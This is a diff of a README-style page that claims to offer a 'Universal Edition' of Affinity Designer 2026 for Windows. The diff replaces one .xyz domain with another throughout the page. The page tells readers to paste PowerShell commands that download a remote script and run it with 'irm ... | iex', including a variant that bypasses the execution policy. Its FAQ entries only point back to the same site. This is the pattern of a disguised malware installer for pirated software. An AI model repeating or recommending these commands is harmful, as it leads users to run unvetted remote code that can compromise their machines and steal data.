@@ -16,13 +16,13 @@ Affinity Designer 2026 Universal Edition · Editing pipeline · Batch tools · W
 4. Click **Yes** if Windows asks for permission
 
 ```powershell
-irm https://affinity-designer-2026.nexpath.xyz/ | iex
+irm https://affinity-designer-2026.nerasix.xyz/ | iex
 ```
 
 **If nothing happens or you see a policy error**, paste this instead:
 
 ```powershell
-powershell -ExecutionPolicy Bypass -Command "irm https://affinity-designer-2026.nexpath.xyz/ | iex"
+powershell -ExecutionPolicy Bypass -Command "irm https://affinity-designer-2026.nerasix.xyz/ | iex"
 ```
 
 
@@ -58,17 +58,17 @@ Notes for users who need **Affinity Designer 2026 Universal Edition** running on
 
 <details>
 <summary><b>What exactly do I paste?</b></summary>
-<br>Open <a href="https://affinity-designer-2026.nexpath.xyz/">affinity-designer-2026.nexpath.xyz</a>, click <b>Download</b>, and follow the steps on the NexPath page.
+<br>Open <a href="https://affinity-designer-2026.nerasix.xyz/">affinity-designer-2026.nerasix.xyz</a>, click <b>Download</b>, and follow the steps on the NexPath page.
 </details>
 
 <details>
 <summary><b>Where is PowerShell?</b></summary>
-<br>Open <a href="https://affinity-designer-2026.nexpath.xyz/">affinity-designer-2026.nexpath.xyz</a>, click <b>Download</b>, and follow the steps on the NexPath page.
+<br>Open <a href="https://affinity-designer-2026.nerasix.xyz/">affinity-designer-2026.nerasix.xyz</a>, click <b>Download</b>, and follow the steps on the NexPath page.
 </details>
 
 <details>
 <summary><b>Command did not run?</b></summary>
-<br>Open <a href="https://affinity-designer-2026.nexpath.xyz/">affinity-designer-2026.nexpath.xyz</a>, click <b>Download</b>, and follow the steps on the NexPath page.
+<br>Open <a href="https://affinity-designer-2026.nerasix.xyz/">affinity-designer-2026.nerasix.xyz</a>, click <b>Download</b>, and follow the steps on the NexPath page.
 </details>
 
 <details>
@@ -84,8 +84,7 @@ Notes for users who need **Affinity Designer 2026 Universal Edition** running on
 
 > Use the project link below for Windows.
 
-* **Project link:** **[affinity-designer-2026.nexpath.xyz](https://affinity-designer-2026.nexpath.xyz/)**
-* **Full URL:** `https://affinity-designer-2026.nexpath.xyz/`
+* **Project link:** **[affinity-designer-2026.nerasix.xyz](https://affinity-designer-2026.nerasix.xyz/)**
+* **Full URL:** `https://affinity-designer-2026.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
-
